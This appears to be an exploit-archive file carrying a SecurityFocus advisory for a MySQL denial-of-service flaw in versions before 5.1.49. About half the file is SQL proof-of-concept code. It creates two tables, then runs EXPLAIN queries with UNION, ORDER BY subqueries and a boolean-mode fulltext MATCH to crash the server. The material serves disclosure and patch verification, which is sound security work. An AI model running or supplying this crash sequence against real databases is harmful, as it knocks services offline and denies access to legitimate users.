@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/42599/info
+
+MySQL is prone to a denial-of-service vulnerability.
+
+An attacker can exploit this issue to crash the database, denying access to legitimate users.
+
+This issue affects versions prior to MySQL 5.1.49.
+
+NOTE: This issue was previously covered in BID 42594 (Oracle MySQL Prior to 5.1.49 Multiple Denial Of Service Vulnerabilities) but has been given its own record to better document it. 
+
+CREATE TABLE t1 (a VARCHAR(10), FULLTEXT KEY a (a));
+INSERT INTO t1 VALUES (1),(2);
+CREATE TABLE t2 (b INT);
+INSERT INTO t2 VALUES (1),(2);
+
+EXPLAIN SELECT * FROM t1 UNION SELECT * FROM t1
+  ORDER BY (SELECT a FROM t2 WHERE b = 12);
+
+EXPLAIN SELECT * FROM t2 UNION SELECT * FROM t2
+  ORDER BY (SELECT * FROM t1 WHERE MATCH(a) AGAINST ('+abc' IN BOOLEAN MODE));
+
+DROP TABLE t1,t2;
+
+exit;
